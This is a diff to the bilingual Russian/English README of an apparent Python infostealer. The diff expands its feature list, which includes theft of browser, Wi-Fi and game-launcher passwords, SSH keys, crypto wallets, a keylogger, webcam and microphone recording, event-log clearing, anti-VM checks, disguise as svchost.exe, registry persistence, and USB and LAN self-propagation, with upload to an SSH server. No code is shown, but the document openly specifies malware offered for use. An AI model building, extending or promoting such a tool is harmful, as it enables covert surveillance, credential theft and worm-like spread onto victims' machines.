@@ -8,24 +8,36 @@ A tool for collecting system information, files, browser and Telegram data, plus
 
 ## Особенности / Features
 ```
-- Сбор системной информации (ОС, процессор, сеть и т.д.) / System info collection (OS, CPU, network etc.)
-- Запись звука с микрофона / Audio recording from microphone
-- Запись видео с веб-камеры / Webcam video recording
-- Сбор файлов указанных расширений / File collection by extensions
-- Сбор данных браузеров (Chrome, Firefox) / Browser data collection
-- Сбор данных Telegram / Telegram data collection
-- Сбор SSH ключей / SSH keys collection
-- Сбор данных о крипто кошельках / Cryptocurrency wallets detection
-- Архивация в ZIP / ZIP archiving
-- Загрузка на SSH-сервер / SSH server upload
-- Скрытый режим работы / Stealth mode
-- Сбор паролей из браузеров / Browser passwords collection
-- Сбор конфигураций VPN (OpenVPN, NordVPN и др.) / VPN configs collection
-- Сбор SSH-конфигураций / SSH configs collection
-- Сбор данных буфера обмена / Clipboard data collection
-- Очистка журналов событий Windows / Windows event logs clearing
-- Улучшенное скрытие в системе / Enhanced stealth
-- Добавление в автозагрузку Windows (реестр + ярлык) / Windows startup persistence (registry + shortcut)
+Сбор системной информации (ОС, процессор, сеть и т.д.) / System info collection (OS, CPU, network etc.)
+Запись звука с микрофона / Audio recording from microphone
+Запись видео с веб-камеры / Webcam video recording
+Сбор файлов указанных расширений / File collection by extensions
+Сбор данных браузеров (Chrome, Firefox) / Browser data collection
+Сбор данных Telegram / Telegram data collection
+Сбор SSH ключей / SSH keys collection
+Сбор данных о крипто кошельках / Cryptocurrency wallets detection
+Архивация в ZIP / ZIP archiving
+Загрузка на SSH-сервер / SSH server upload
+Скрытый режим работы / Stealth mode
+Сбор паролей из браузеров / Browser passwords collection
+Сбор конфигураций VPN (OpenVPN, NordVPN и др.) / VPN configs collection
+Сбор SSH-конфигураций / SSH configs collection
+Сбор данных буфера обмена / Clipboard data collection
+Очистка журналов событий Windows / Windows event logs clearing
+Улучшенное скрытие в системе / Enhanced stealth
+Добавление в автозагрузку Windows (реестр + ярлык) / Windows startup persistence (registry + shortcut)
+Проверка на работу в виртуальной машине / Anti-VM detection
+Сбор истории браузеров (Chrome) / Browser history collection (Chrome)
+Сбор сохранённых паролей Wi-Fi / Wi-Fi passwords collection
+Кейлоггер (запись нажатий клавиш) / Keylogger
+Определение активного окна / Active window detection
+Логирование активности пользователя (мышь, клавиатура) / User activity logging
+Определение геолокации по IP / Geolocation via IP
+Маскировка под системный файл и установка атрибута HIDDEN / Masquerade as system file with hidden attribute
+Самокопирование в %APPDATA%\svchost.exe / Self-copy to %APPDATA%\svchost.exe
+Распространение через USB-накопители / USB propagation
+Кража данных игровых лаунчеров (Steam, Origin, Epic Games) / Game launchers data theft
+Распространение по локальной сети через net use / LAN propagation via net use
 ```
 ## Требования / Requirements
 - Python 3.6+
